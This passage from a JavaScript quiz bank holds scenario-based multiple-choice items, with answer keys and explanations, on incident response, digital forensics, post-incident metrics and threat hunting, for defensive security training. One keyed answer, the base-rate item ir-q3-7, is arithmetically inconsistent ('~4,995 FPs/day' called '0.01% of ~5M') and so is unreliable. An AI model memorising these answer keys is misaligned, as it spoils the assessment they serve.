              scenario: "Alert: 'psexec.exe on FS-03'. Investigation shows it was run by the IT admin during a documented change window from their jumpbox.",
              question: "Correct classification?",
              options: [
                  "False Positive",
                  "True Positive - Benign (behavior detected accurately but expected/authorized) — feed back into tuning as an allowlist, not a rule deletion",
                  "False Negative",
                  "Incident"
              ],
              correctAnswer: 1,
              explanation: "The rule correctly detected the behavior — that's not a false positive. It is a benign true positive; the correct action is scoped suppression (this admin, jumpbox, change window) so future rule fidelity is preserved."
          },
          {
              id: "ir-q3-5",
              difficulty: "medium",
              tags: [
                  "Pyramid of Pain"
              ],
              scenario: "Your IOC feed adds 200 new adversary IPs weekly. You block them at the firewall. Detections still miss the actor.",
              question: "Which model explains the gap?",
              options: [
                  "Cyber Kill Chain",
                  "Pyramid of Pain — IPs/hashes are trivial for the adversary to change; detecting TTPs (behavioral) causes durable pain",
                  "MITRE D3FEND only",
                  "STRIDE"
              ],
              correctAnswer: 1,
              explanation: "Bianco's Pyramid of Pain: hash/IP/domain indicators are cheap to rotate; tools are harder; TTPs are hardest and most durable. Detection strategy should be layered but weighted toward behavior (ATT&CK-aligned) for real friction."
          },
          {
              id: "ir-q3-6",
              difficulty: "medium",
              tags: [
                  "First Hour"
              ],
              scenario: "A True Positive intrusion is confirmed at 14:02. What are the first-hour minimum artifacts to preserve before any remediation?",
              question: "Pick the strongest checklist.",
              options: [
                  "Reimage immediately",
                  "Volatile-first triage: memory image, running process list, netstat/conntrack, current logons, autoruns, recent event logs, EDR timeline export, DNS/proxy for host — with hashes and timestamps",
                  "Only screenshots",
                  "Only the malware sample"
              ],
              correctAnswer: 1,
              explanation: "Order of volatility (RFC 3227) drives triage: RAM, network state, logged-on users, and ephemeral artifacts vanish first. Capture these before containment actions that reboot, disconnect, or reimage."
          },
          {
              id: "ir-q3-7",
              difficulty: "hard",
              tags: [
                  "Base-Rate Fallacy"
              ],
              scenario: "An ML detection is 99% accurate. It alerts once per 10,000 events. Your environment produces 5M events/day.",
              question: "How many false positives per day should you expect, and what's the analyst lesson?",
              options: [
                  "~50 — accuracy is fine",
                  "~4,995 FPs/day (0.01% of ~5M) if the true positive rate is ~1/10,000 — 'accuracy' is the wrong metric; measure precision and analyst-hours-per-TP",
                  "Zero — 99% is perfect",
                  "500 — but they self-resolve"
              ],
              correctAnswer: 1,
              explanation: "The base-rate fallacy: at very low incident prevalence, even a highly 'accurate' classifier drowns analysts in false positives. Detection ROI is measured in precision, analyst minutes per TP, and mean-time-to-triage — not headline accuracy."
          },
          {
              id: "ir-q3-8",
              difficulty: "hard",
              tags: [
                  "Correlation"
              ],
              scenario: "Three low-severity alerts in the same 20 minutes on one host: (1) Office spawns cmd.exe, (2) new scheduled task, (3) outbound to a newly-registered domain.",
              question: "Correct triage move?",
              options: [
                  "Close each as low",
                  "Treat as a correlated intrusion chain (Initial Access → Persistence → C2); escalate as High and preserve volatile evidence immediately",
                  "Wait for a 4th alert",
                  "Ignore — Office spawning cmd is normal"
              ],
              correctAnswer: 1,
              explanation: "Individually low, together they trace a kill-chain progression on a single asset within a short window. Correlation (host+user+time) upgrades severity and is the whole point of a SIEM/XDR layer over point tools."
          },
          {
              id: "ir-q3-9",
              difficulty: "hard",
              tags: [
                  "Cognitive Bias"
              ],
              scenario: "An analyst decides it's benign in the first 30 seconds and then only cites evidence that supports 'benign', dismissing contradicting artifacts.",
              question: "Which bias is this and what's the mitigation?",
              options: [
                  "Anchoring — ignore it",
                  "Confirmation bias — mitigate with structured analytic techniques (ACH, red-team review, mandatory 'what would prove me wrong?' step)",
                  "Availability bias — resolved by more caffeine",
                  "Not a bias — normal triage"
              ],
              correctAnswer: 1,
              explanation: "Confirmation bias is the leading cognitive failure in triage. Mitigations include structured techniques (Analysis of Competing Hypotheses), peer review on TP/FP calls, and forcing a disconfirming-evidence step in the playbook."
          },
          {
              id: "ir-q3-10",
              difficulty: "hard",
              tags: [
                  "Escalation Criteria"
              ],
              scenario: "A Tier-1 analyst sits on a suspicious alert for 45 minutes 'to investigate a little more' before escalating.",
              question: "Which governance control is missing?",
              options: [
                  "None — analyst discretion is best",
                  "Time-boxed escalation criteria: explicit triggers (evidence of persistence, credential theft, DC/PCI/PHI asset, exfil, etc.) plus a hard time cap on tier-1 handling",
                  "Larger monitors",
                  "More SIEM licenses"
              ],
              correctAnswer: 1,
              explanation: "Escalation must be deterministic: named triggers and a maximum tier-1 dwell before automatic hand-off. Analyst hesitation is the single largest contributor to elevated MTTD/MTTR."
          }
      ]
  },
  {
      quizId: "ir-q4",
      courseId: "incident-response",
      title: "Containment, Eradication & Recovery",
      description: "Scenario-based CER decisions: isolation strategy, eradication depth, and safe recovery under business pressure.",
      passingScore: 70,
      timeLimit: 25,
      questions: [
          {
              id: "ir-q4-1",
              difficulty: "easy",
              tags: [
                  "Network Isolation"
              ],
              scenario: "A workstation is beaconing to known C2. The user is a C-level exec on a video call.",
              question: "Best containment action?",
              options: [
                  "Nothing until the call ends",
                  "EDR network-contain (allow EDR management, block all else) — preserves forensic state, stops C2, avoids full reboot; then coordinate with the exec",
                  "Reimage immediately",
                  "Power off the laptop"
              ],
              correctAnswer: 1,
              explanation: "EDR network containment is precisely designed for this: severs adversary access while retaining volatile artifacts and EDR telemetry, unlike a hard power-off (destroys RAM) or reimage (destroys evidence and re-creates conflict with the exec)."
          },
          {
              id: "ir-q4-2",
              difficulty: "easy",
              tags: [
                  "Credential Rotation"
              ],
              scenario: "You confirm an attacker had SYSTEM on a domain-joined server for 6 hours.",
              question: "Which credentials must you consider potentially compromised?",
              options: [
                  "Only the local admin",
                  "Every credential exposed to that host: local accounts, cached domain creds, service accounts running on it, Kerberos tickets, and any account that authenticated during the window",
                  "Only the last-logged-in user",
                  "None if AV is clean"
              ],
              correctAnswer: 1,
              explanation: "SYSTEM on a Windows host can extract LSASS, DPAPI, cached creds, and Kerberos TGTs. Assume every credential material *present or arriving* during the compromise window is exposed — rotate broadly and force TGT refresh."
          },
          {
              id: "ir-q4-3",
              difficulty: "medium",
              tags: [
                  "Short vs Long Containment"
              ],
              scenario: "Ransomware detected on 8 hosts in one VLAN. Business begs you not to isolate the VLAN because it hosts revenue-critical apps.",
              question: "How do you decide?",
              options: [
                  "Always isolate immediately",
                  "Weigh spread velocity vs revenue impact using pre-approved thresholds; if spread is active, isolate now — pre-approved authority avoids case-by-case debate mid-incident",
                  "Never isolate revenue systems",
                  "Ask on Twitter"
              ],
              correctAnswer: 1,
              explanation: "Containment decisions are business-risk calls that must be pre-authorized in policy with thresholds (spread rate, asset class, data classification). Mid-incident negotiation is the failure mode ransomware operators depend on."
          },
          {
              id: "ir-q4-4",
              difficulty: "medium",
              tags: [
                  "Eradication Depth"
              ],
              scenario: "You remove the malware binary and its scheduled task. Two days later the host beacons again.",
              question: "Which eradication step was skipped?",
              options: [
                  "Antivirus scan",
                  "Full persistence sweep + root-cause remediation: WMI subs, services, drivers, DLL hijacks, run keys, RMM tools, valid accounts, and the *initial access vector* itself",
                  "Reboot",
                  "Password change on the admin only"
              ],
              correctAnswer: 1,
              explanation: "Adversaries plant multiple persistence mechanisms (services, WMI, scheduled tasks, run keys, RMM, valid accounts, driver-level). Eradication must enumerate all of them AND close the initial-access vector, or re-compromise is near-certain."
          },
          {
              id: "ir-q4-5",
              difficulty: "medium",
              tags: [
                  "Golden Ticket"
              ],
              scenario: "You confirm the attacker extracted the krbtgt hash from a DC three weeks ago.",
              question: "What eradication step is mandatory?",
              options: [
                  "Reboot the DC",
                  "Double krbtgt password reset (twice, with wait for replication and ticket lifetime in between) to invalidate all forgeable golden tickets",
                  "Rotate the affected user's password",
                  "Disable SMBv1"
              ],
              correctAnswer: 1,
              explanation: "krbtgt compromise = full Kerberos forgery capability (golden tickets, valid for the ticket lifetime, up to 10 years by default). The documented remediation is two sequential krbtgt resets separated by replication + max ticket lifetime."
          },
          {
              id: "ir-q4-6",
              difficulty: "medium",
              tags: [
                  "Backup Recovery"
              ],
              scenario: "You restore from a backup taken 5 days before detection.",
              question: "What must you verify before returning to production?",
              options: [
                  "That the backup boots",
                  "That the backup pre-dates initial compromise (not just detection), is malware-free, patches the exploited vector, and enters a monitored quarantine before full trust",
                  "Nothing — backups are trusted",
                  "That the backup is the newest available"
              ],
              correctAnswer: 1,
              explanation: "Dwell time is usually much longer than time-to-detection. The correct backup pre-dates *initial* compromise, is verified malware-free, is patched for the entry vector, and gets extra monitoring during a probation window."
          },
          {
              id: "ir-q4-7",
              difficulty: "hard",
              tags: [
                  "Root Cause"
              ],
              scenario: "Recovery is complete. Post-incident, someone asks: 'What was the root cause?' The team answers: 'Malware got in.'",
              question: "Why is this insufficient?",
              options: [
                  "It isn't",
                  "'Malware got in' is the symptom. Root cause is the systemic gap that allowed it (unpatched Exchange CVE, missing MFA, allowed macro from external sender, exposed RDP, unmonitored service account) — only fixing that prevents recurrence",
                  "Malware is always the root cause",
                  "Root cause analysis is optional"
              ],
              correctAnswer: 1,
              explanation: "Root cause is the systemic failure (control gap, misconfiguration, process defect) that enabled the intrusion. Without naming it, remediation is cosmetic and re-compromise metrics will show it within weeks."
          },
          {
              id: "ir-q4-8",
              difficulty: "hard",
              tags: [
                  "Watch & Learn vs Contain"
              ],
              scenario: "You detect a sophisticated actor doing recon. Executives want to 'watch and learn' to gather intel; legal wants immediate containment.",
              question: "Which framing is correct?",
              options: [
                  "Always watch — intel is priceless",
                  "This is a governance decision requiring pre-defined authority: 'monitor mode' only under written approval, hard time-box, defined exit criteria, and continuous safety review — otherwise contain",
                  "Always contain immediately",
                  "Ask the attacker to stop"
              ],
              correctAnswer: 1,
              explanation: "Extended monitoring carries real risk (spread, exfil, liability). It requires pre-authorized written approval, containment tripwires, and continuous risk reassessment. Absent that governance, the default must be containment."
          },
          {
              id: "ir-q4-9",
              difficulty: "hard",
              tags: [
                  "Ransomware Recovery"
              ],
              scenario: "Ransomware has encrypted 40% of file shares. Backups exist. Business asks whether they should also pay 'as insurance'.",
              question: "What is the most defensible advisory?",
              options: [
                  "Always pay",
                  "Pay decisions carry OFAC/sanctions risk, no delivery guarantee, tax on future targets, and no assurance of eradication — decision is legal/executive with counsel; technically, prioritize proven, tested restore from clean backups",
                  "Never document",
                  "Pay only in crypto"
              ],
              correctAnswer: 1,
              explanation: "Payment is a legal/executive decision with sanctions (OFAC), insurance, disclosure, and re-victimization implications. IR's role is to enable a clean, tested restore path AND close the initial vector so payment (if made) doesn't just fund the next attack on you."
          },
          {
              id: "ir-q4-10",
              difficulty: "hard",
              tags: [
                  "Recovery Validation"
              ],
              scenario: "Systems are 'recovered'. Someone asks how you know the environment is clean.",
              question: "What is a defensible validation?",
              options: [
                  "AV scan returned clean",
                  "Multi-signal validation: fresh IOC sweep, retro-hunt against last 30–90 days of telemetry, EDR re-baseline, network egress review, identity anomaly monitoring, tabletop-style red-team probes, plus a defined heightened-monitoring period",
                  "Users report no issues",
                  "The malware family scanner shows nothing"
              ],
              correctAnswer: 1,
              explanation: "Recovery validation is a program, not a single scan: IOC + behavior sweeps across historical telemetry, identity checks, egress review, and an explicit heightened-monitoring window before declaring the incident closed."
          }
      ]
  },
  {
      quizId: "ir-q5",
      courseId: "incident-response",
      title: "Digital Forensics & Evidence Handling",
      description: "Scenario-based DFIR: acquisition, chain of custody, memory/disk artifacts, and defensible analysis.",
      passingScore: 70,
      timeLimit: 25,
      questions: [
          {
              id: "ir-q5-1",
              difficulty: "easy",
              tags: [
                  "Order of Volatility",
                  "RFC 3227"
              ],
              scenario: "You arrive at a running suspect host. You can only capture one artifact class before shutdown.",
              question: "Which do you capture first per RFC 3227?",
              options: [
                  "Disk image",
                  "Memory (RAM) — highest volatility; contains process state, encryption keys, network connections, injected code, and cleartext creds lost on power-off",
                  "Registry export",
                  "Event logs"
              ],
              correctAnswer: 1,
              explanation: "Order of volatility (RFC 3227): CPU/registers → RAM → network state → running processes → disk → archival. Memory captures ephemeral evidence (keys, injected code, LSASS) that vanishes at shutdown."
          },
          {
              id: "ir-q5-2",
              difficulty: "easy",
              tags: [
                  "Hashing",
                  "Integrity"
              ],
              scenario: "You image a 2 TB drive. What must you record to prove integrity later?",
              question: "Correct answer?",
              options: [
                  "File size only",
                  "Cryptographic hash (SHA-256 recommended) of source and image, computed with a write-blocker in place, logged with acquirer, timestamp, tool, and version",
                  "MD5 without documentation",
                  "Nothing — the imaging tool handles it"
              ],
              correctAnswer: 1,
              explanation: "Evidentiary integrity requires pre- and post-acquisition hashes (SHA-256), write-blocking, and a full acquisition log (who/when/tool/version). MD5 alone is discouraged; undocumented hashes are worthless in dispute."
          },
          {
              id: "ir-q5-3",
              difficulty: "medium",
              tags: [
                  "Chain of Custody"
              ],
              scenario: "An imaged drive moves: analyst A → evidence locker → analyst B → external counsel. No log is kept.",
              question: "What is the consequence?",
              options: [
                  "None if the hash matches",
                  "Chain of custody is broken; opposing counsel can challenge admissibility and weight — even valid hashes cannot cure missing custody",
                  "Only affects criminal cases",
                  "The evidence is auto-destroyed"
              ],
              correctAnswer: 1,
              explanation: "Chain of custody is a documented, unbroken trail (who had it, when, why, where, how transferred). Hashes prove file integrity, not custody integrity. Both are required for defensible use."
          },
          {
              id: "ir-q5-4",
              difficulty: "medium",
              tags: [
                  "Memory Forensics",
                  "Volatility"
              ],
              scenario: "In a memory image you see: explorer.exe → cmd.exe → powershell.exe → rundll32.exe with a suspicious network connection, and an injected private memory region in lsass.exe.",
              question: "What is the most likely finding?",
              options: [
                  "Benign IT activity",
                  "Interactive intrusion with credential access (LSASS injection consistent with mimikatz-style dumping) — priority artifact for triage",
                  "Automated software update",
                  "Antivirus scan"
              ],
              correctAnswer: 1,
              explanation: "Interactive process ancestry from explorer, unusual rundll32 network activity, and RWX-injected regions in LSASS are classic credential-access patterns. Volatility/Volatility3 plugins (malfind, hollowfind, ldrmodules, netscan) confirm."
          },
          {
              id: "ir-q5-5",
              difficulty: "medium",
              tags: [
                  "Disk Artifacts"
              ],
              scenario: "You need to prove a user opened a specific file on a Windows 10 host.",
              question: "Which artifact set is most defensible?",
              options: [
                  "Recycle bin only",
                  "MFT + $LogFile/$UsnJrnl + Shellbags + LNK files + Jumplists + Prefetch + RecentDocs + browser/Office MRU — corroborate across multiple artifact classes",
                  "The file's last-modified time only",
                  "System reboot log"
              ],
              correctAnswer: 1,
              explanation: "Windows records user activity across many artifact classes. Defensible attribution corroborates across MFT, USN, Shellbags, LNK/Jumplists, Prefetch, and application MRUs — no single artifact is sufficient."
          },
          {
              id: "ir-q5-6",
              difficulty: "medium",
              tags: [
                  "Timeline Analysis"
              ],
              scenario: "You need to reconstruct 'what happened between 14:00 and 14:30' on a Windows server.",
              question: "Best approach?",
              options: [
                  "Guess from AV logs",
                  "Build a super-timeline (e.g., Plaso/log2timeline) combining MFT, event logs, registry, prefetch, browser, EDR, and network logs — normalized to UTC",
                  "Read the AV log only",
                  "Rely on user memory"
              ],
              correctAnswer: 1,
              explanation: "Super-timelines fuse artifact classes into one time-ordered view (UTC), which is the only way to reconstruct attacker sequencing across process, filesystem, registry, and network layers."
          },
          {
              id: "ir-q5-7",
              difficulty: "hard",
              tags: [
                  "Anti-Forensics"
              ],
              scenario: "An attacker cleared Windows event logs (EID 1102). You need to reconstruct activity.",
              question: "Which sources survive log clearing?",
              options: [
                  "None",
                  "USN journal, $LogFile, prefetch, shimcache/amcache, registry hives (SYSTEM, SOFTWARE, NTUSER), EDR/SIEM copies, network telemetry (Zeek/firewall/proxy), and backup event logs — plus the 1102 event itself is forensically valuable",
                  "Only the current event log",
                  "Only the recycle bin"
              ],
              correctAnswer: 1,
              explanation: "Windows leaves parallel records outside the security log: filesystem journals, execution artifacts (Prefetch, Amcache, Shimcache), registry, and remote/EDR copies. Central log forwarding + EDR are the strongest anti-anti-forensics investments."
          },
          {
              id: "ir-q5-8",
              difficulty: "hard",
              tags: [
                  "Cloud Forensics"
              ],
              scenario: "The compromised asset is an AWS EC2 instance. The IR team's laptop-forensics playbook doesn't apply.",
              question: "What is the correct cloud-native approach?",
              options: [
                  "SSH in and run tools live",
                  "Snapshot EBS volumes, capture memory via SSM/agent, isolate via security-group swap, preserve CloudTrail/GuardDuty/VPC Flow, then analyze from a forensics VPC — no live changes on the victim",
                  "Terminate the instance first",
                  "Wait for AWS support"
              ],
              correctAnswer: 1,
              explanation: "Cloud DFIR uses provider primitives: EBS snapshots (immutable, hash-verified), memory capture via SSM/agent, network isolation via SG replacement, and control-plane logs (CloudTrail/GuardDuty/Flow Logs) — investigation happens in an isolated forensics VPC, not on the victim."
          },
          {
              id: "ir-q5-9",
              difficulty: "hard",
              tags: [
                  "Malware Triage"
              ],
              scenario: "You recover a suspicious PE. Detonating on a personal laptop feels fastest.",
              question: "Why is that wrong?",
              options: [
                  "It's fine if AV is on",
                  "Malware must be handled in an isolated, instrumented sandbox (network-isolated or C2-simulated, snapshotted VM) with proper handling procedures — laptop detonation risks infection, data loss, and evidence contamination",
                  "Personal laptops are safer",
                  "Only .exe files are dangerous"
              ],
              correctAnswer: 1,
              explanation: "Analysis requires isolated, instrumented environments (Cuckoo/Any.Run/CAPE, snapshotted VMs, INetSim/FakeNet) with defined handling procedures. Ad-hoc detonation risks host infection, C2 callback, evidence contamination, and legal exposure."
          },
          {
              id: "ir-q5-10",
              difficulty: "hard",
              tags: [
                  "Attribution"
              ],
              scenario: "After analysis, someone asks: 'Which nation-state actor did this?'",
              question: "What is the most defensible response?",
              options: [
                  "Name a group publicly",
                  "Attribution is high-confidence only with converging evidence (TTPs, infrastructure, code lineage, timing/geopolitics, human intel) and is generally beyond a single victim's dataset — report observed behavior mapped to ATT&CK; leave named-actor attribution to vendors/government",
                  "Blame the loudest headline group",
                  "Refuse to write anything"
              ],
              correctAnswer: 1,
              explanation: "Defensible attribution combines TTPs, infrastructure, code overlap, tradecraft, and non-technical signals. Most enterprises lack the datasets. Reports should describe behavior/ATT&CK mapping; named-actor claims belong to specialized vendors and government."
          }
      ]
  },
  {
      quizId: "ir-q6",
      courseId: "incident-response",
      title: "Post-Incident, Metrics & Continuous Improvement",
      description: "Scenario-based post-incident: blameless reviews, reporting, metrics that matter, and turning incidents into durable improvement.",
      passingScore: 70,
      timeLimit: 20,
      questions: [
          {
              id: "ir-q6-1",
              difficulty: "easy",
              tags: [
                  "Blameless Post-Mortem"
              ],
              scenario: "In the lessons-learned meeting, the CIO opens with: 'Whose fault was this?'",
              question: "How should the facilitator reframe?",
              options: [
                  "Answer with a name",
                  "Redirect to a blameless format: 'Which decisions made sense with the information available, and which system/process changes would make the right decision easier next time?'",
                  "Cancel the meeting",
                  "Blame the vendor"
              ],
              correctAnswer: 1,
              explanation: "Blameless reviews (Google/Etsy tradition) surface systemic root causes because participants stop defending themselves. Naming individuals kills future candor, guarantees repeat incidents, and produces action items nobody will own honestly."
          },
          {
              id: "ir-q6-2",
              difficulty: "easy",
              tags: [
                  "Timing"
              ],
              scenario: "When should the lessons-learned meeting occur?",
              question: "Best window and why?",
              options: [
                  "Immediately after containment while adrenaline is high",
                  "Within ~2 weeks of closure — recent enough for accurate recall, distant enough for perspective and a written timeline",
                  "During the next annual audit",
                  "Never — retros are optional"
              ],
              correctAnswer: 1,
              explanation: "Two weeks balances recall fidelity with reflection. Immediate reviews mix trauma with analysis; delayed reviews lose context and momentum on action items."
          },
          {
              id: "ir-q6-3",
              difficulty: "medium",
              tags: [
                  "Action Items"
              ],
              scenario: "The retro produces 22 action items. Six months later, 3 are done and the rest are 'in progress'.",
              question: "Which structural fix helps most?",
              options: [
                  "Cancel retros",
                  "Every action item requires a named single owner, a deadline, clear acceptance criteria, and a monthly review with executive visibility — tracked like any other engineering commitment",
                  "Add more action items",
                  "Assign to 'the team'"
              ],
              correctAnswer: 1,
              explanation: "Action items without owner/deadline/acceptance/executive visibility are wishes. Program-level tracking (with escalation) is what turns lessons into durable improvement — this is the difference between mature and cosmetic post-mortems."
          },
          {
              id: "ir-q6-4",
              difficulty: "medium",
              tags: [
                  "Metrics",
                  "MTTD/MTTR"
              ],
              scenario: "Your MTTD is trending upward for two quarters.",
              question: "Where do you invest?",
              options: [
                  "Faster containment tools",
                  "Detection coverage and quality: ATT&CK gap analysis, telemetry coverage (endpoint/identity/cloud), rule precision, threat-informed hunting, tuning of noisy rules",
                  "More marketing",
                  "Reduce logging"
              ],
              correctAnswer: 1,
              explanation: "MTTD is bounded by what you can see and how well you can see it. Fix telemetry gaps, ATT&CK coverage, and detection quality (precision/recall) before adding response horsepower — you cannot respond to what you cannot detect."
          },
          {
              id: "ir-q6-5",
              difficulty: "medium",
              tags: [
                  "Dwell Time"
              ],
              scenario: "Which metric best captures 'how long the attacker had free run of the environment'?",
              question: "Pick and justify.",
              options: [
                  "MTTR",
                  "Dwell time — initial compromise to eradication; the single most business-relevant intrusion metric because it correlates with blast radius, exfil volume, and cost",
                  "Alert count",
                  "MTBF"
              ],
              correctAnswer: 1,
              explanation: "Dwell time (compromise → eradication) integrates detection AND response effectiveness and is the metric most correlated with breach cost and scope. Industry reports (Mandiant, IBM) track it as the north-star."
          },
          {
              id: "ir-q6-6",
              difficulty: "medium",
              tags: [
                  "Executive Reporting"
              ],
              scenario: "You draft an incident report starting with: 'On host WKS-4471 we observed rundll32.exe executing a DLL from %AppData%…'",
              question: "What's wrong for the executive summary?",
              options: [
                  "Nothing",
                  "Executive Summary must be business-language: what happened, business impact, data involved, actions taken, current status, top recommendations — technical detail belongs later in the report",
                  "Add more commands",
                  "Remove all timestamps"
              ],
              correctAnswer: 1,
              explanation: "Executive summaries answer: what, so-what, now-what — in business terms. Technical detail lives in the analysis section for the technical audience. Mixing the two loses both audiences."
          },
          {
              id: "ir-q6-7",
              difficulty: "hard",
              tags: [
                  "Re-compromise Rate"
              ],
              scenario: "Six months after the incident, the same threat actor is back via a different but related vector.",
              question: "What does this indicate and how do you measure it?",
              options: [
                  "Bad luck",
                  "Incomplete eradication or unaddressed root cause. Track 're-compromise rate' (repeat intrusions by same actor/vector/family within a defined window) as a leading indicator of eradication quality",
                  "Attacker skill",
                  "Nothing measurable"
              ],
              correctAnswer: 1,
              explanation: "Re-compromise rate is the sharpest measure of eradication + root-cause quality. Rising rate = you're treating symptoms. It should be reviewed alongside MTTD/MTTR/dwell."
          },
          {
              id: "ir-q6-8",
              difficulty: "hard",
              tags: [
                  "Timestamps",
                  "Correlation"
              ],
              scenario: "Different systems in your report show times in EST, IST, and UTC. Correlating events becomes error-prone.",
              question: "What standard should reports use?",
              options: [
                  "Analyst's local time",
                  "All timestamps in UTC (ISO 8601, e.g., 2026-01-14T14:02:31Z); optionally show local time in parentheses. Enforce clock sync (NTP) as a Preparation requirement",
                  "Local time of each server",
                  "Whatever the SIEM shows"
              ],
              correctAnswer: 1,
              explanation: "UTC + ISO 8601 is the only defensible standard for multi-system, multi-region correlation and legal reporting. Reliable time also requires enforced NTP/PTP across sources — a Preparation-phase control."
          },
          {
              id: "ir-q6-9",
              difficulty: "hard",
              tags: [
                  "Improvement Categories"
              ],
              scenario: "Retro produces: (a) 'Deploy EDR to 400 uncovered Linux hosts', (b) 'Add krbtgt rotation playbook branch', (c) 'Train Tier-1 on Kerberos abuse'.",
              question: "Classify each into People / Process / Technology.",
              options: [
                  "All Technology",
                  "a = Technology (coverage), b = Process (playbook), c = People (training) — a healthy retro produces items across all three categories",
                  "All Process",
                  "Only People matters"
              ],
              correctAnswer: 1,
              explanation: "Balanced improvement portfolios span People, Process, and Technology. Retros dominated by one category (usually 'buy a tool') indicate weak root-cause analysis and predict recurrence."
          },
          {
              id: "ir-q6-10",
              difficulty: "hard",
              tags: [
                  "Maturity"
              ],
              scenario: "Leadership asks: 'When do we become a metrics-driven IR program?'",
              question: "Best framing?",
              options: [
                  "When we buy a dashboard",
                  "At CMMI Level 4 (Quantitatively Managed): processes are defined (Level 3), instrumented, and *decisions* are driven by measured performance — the shift is behavioral, not tooling",
                  "When we hire more analysts",
                  "Never — IR can't be measured"
              ],
              correctAnswer: 1,
              explanation: "CMMI Level 4 requires that processes exist (Level 3) AND that quantitative data drives management decisions. Dashboards without decision authority ≠ metrics-driven. The distinguishing behavior is: 'we changed X because the metric said Y'."
          }
      ]
   },
  {
      quizId: "th-q1",
      courseId: "threat-hunting",
      title: "Hunting Methodology & Frameworks",
      description: "Scenario-based drills on hypothesis-driven hunting, the Hunting Maturity Model, and program design.",
      passingScore: 70,
      timeLimit: 20,
      questions: [
          {
              id: "th-q1-1",
              difficulty: "easy",
              tags: ["Definition", "Proactive vs Reactive"],
              scenario: "Your SOC director says: 'We already have 400 correlation rules and a 24/7 tier-1 queue. Why do we need a hunt team?' No unresolved alerts are open right now.",
              question: "What is the single most defensible answer that distinguishes hunting from detection?",
              options: [
                  "Hunting replaces the SIEM once maturity is high enough",
                  "Hunting is proactive and hypothesis-driven — it looks for adversary behavior the current detections cannot see, in the absence of any alert",
                  "Hunting is just tier-3 alert triage under a different name",
                  "Hunting exists to satisfy compliance frameworks such as PCI 10.6"
              ],
              correctAnswer: 1,
              explanation: "Detection answers 'did a known-bad thing fire?'. Hunting answers 'is something bad happening that we do not yet detect?' — it explicitly operates without a triggering alert and turns findings back into new detections."
          },
          {
              id: "th-q1-2",
              difficulty: "easy",
              tags: ["HMM", "Sqrrl"],
              scenario: "You are asked to place your org on Sqrrl's Hunting Maturity Model. You ingest EDR + firewall + DNS centrally, run monthly IOC sweeps from vendor feeds, but write no custom analytics and never share hunt output back to detection engineering.",
              question: "Which HMM level describes you, and what is the next step up?",
              options: [
                  "HM0 → HM1: start collecting data",
                  "HM1 (Minimal) → HM2 (Procedural): adopt and repeat published hunting procedures from the community",
                  "HM2 → HM3: build a threat intel platform",
                  "HM3 (Innovative) → HM4: hire more analysts"
              ],
              correctAnswer: 1,
              explanation: "Routine collection + indicator search = HM1. HM2 is defined by repeatable, documented procedures (e.g., ThreatHunter Playbook, MITRE-aligned hunts). HM3 introduces novel analytics; HM4 automates them."
          },
          {
              id: "th-q1-3",
              difficulty: "medium",
              tags: ["Hypothesis Quality"],
              scenario: "Four hunters submit hypotheses for the sprint:\nA: 'There might be bad stuff on endpoints.'\nB: 'APT29 uses WMI event subscriptions for persistence; check WMI-Activity 5861 on all DCs for the last 30 days.'\nC: 'Users are probably clicking phishing.'\nD: 'Something is wrong with the network.'",
              question: "Which hypothesis is properly formed, and why?",
              options: [
                  "A — broad coverage is best",
                  "B — it is specific, testable, tied to a TTP, mapped to a data source, and time-bounded",
                  "C — user behavior is always the top risk",
                  "D — network anomalies are easiest to find"
              ],
              correctAnswer: 1,
              explanation: "A good hunt hypothesis is specific, falsifiable, tied to observable telemetry, and scoped in time. A/C/D are unfalsifiable — you can neither prove nor disprove them with data."
          },
          {
              id: "th-q1-4",
              difficulty: "medium",
              tags: ["TaHiTI", "Hunt Loop"],
              scenario: "Your team is adopting the TaHiTI methodology. You have a validated hypothesis about DLL search-order hijacking in a specific vendor product.",
              question: "What is the correct next phase before you start querying data?",
              options: [
                  "Write the executive report",
                  "Investigate — define data sources, analytical techniques, expected artifacts, and success/failure criteria",
                  "Immediately open an incident ticket",
                  "Deploy a new EDR agent"
              ],
              correctAnswer: 1,
              explanation: "TaHiTI = Initiate → Hunt (which includes Define + Investigate) → Finalize. Jumping into queries without defining data, technique, and success criteria produces unrepeatable hunts and unmeasurable outcomes."
          },
          {
              id: "th-q1-5",
              difficulty: "medium",
              tags: ["Intel-driven vs Data-driven"],
              scenario: "Two proposals hit your backlog the same day:\n1) A CISA advisory drops fresh TTPs for a ransomware crew targeting your vertical.\n2) A data scientist notices a long-tail cluster of rare parent-child process pairs on 12 laptops.",
              question: "How should a mature program treat these?",
              options: [
                  "Only #1 counts — hunts must start from intel",
                  "Only #2 counts — intel is unreliable",
                  "Both are valid: #1 is intel-driven, #2 is data-driven (anomaly/analytics-led); run them in parallel with the same rigor",
                  "Neither — wait for an alert"
              ],
              correctAnswer: 2,
              explanation: "Hunts are legitimately triggered by intel, situational awareness, analytics, or prior incidents. A mature backlog explicitly categorizes and prioritizes across these trigger types."
          },
          {
              id: "th-q1-6",
              difficulty: "medium",
              tags: ["MITRE ATT&CK", "Coverage"],
              scenario: "You render your detection coverage against ATT&CK Enterprise and see solid coverage for Execution and Defense Evasion, but Discovery, Credential Access, and Lateral Movement are almost empty.",
              question: "Where should the next quarter's hunts focus, and why?",
              options: [
                  "Add more Execution rules — double down on strengths",
                  "Prioritize hunts across Discovery, Credential Access, and Lateral Movement — those are the mid-kill-chain steps adversaries must take, and current blind spots there mean intrusions will progress unseen",
                  "Focus on Impact only — that is where damage happens",
                  "Coverage maps are marketing; ignore the gaps"
              ],
              correctAnswer: 1,
              explanation: "ATT&CK coverage mapping is used to redirect effort into gaps. Discovery/CredAccess/LatMov are unavoidable steps in almost every intrusion — blind spots there guarantee late detection."
          },
          {
              id: "th-q1-7",
              difficulty: "medium",
              tags: ["Negative Results"],
              scenario: "A 3-week hunt for Kerberoasting across every DC finds nothing. A manager wants to mark the hunt 'wasted effort'.",
              question: "What is the correct disposition?",
              options: [
                  "Delete the notebook — negatives have no value",
                  "Record it as a validated coverage claim: hypothesis, data sources, queries, time window, and 'no evidence found' — this is auditable assurance and hardens the baseline",
                  "Re-run it forever until it finds something",
                  "Convert it to an incident anyway"
              ],
              correctAnswer: 1,
              explanation: "A properly documented negative hunt is a form of assurance evidence and a reusable baseline. It also feeds detection engineering: if you cannot detect it, you cannot claim absence."
          },
          {
              id: "th-q1-8",
              difficulty: "hard",
              tags: ["Cognitive Bias"],
              scenario: "You hypothesize a specific APT is inside the environment. Every query you write filters for that group's known IPs and hashes. After a week you conclude 'clean' and close the hunt.",
              question: "Which cognitive trap did you fall into, and how do you fix it?",
              options: [
                  "Anchoring — pick different IPs next time",
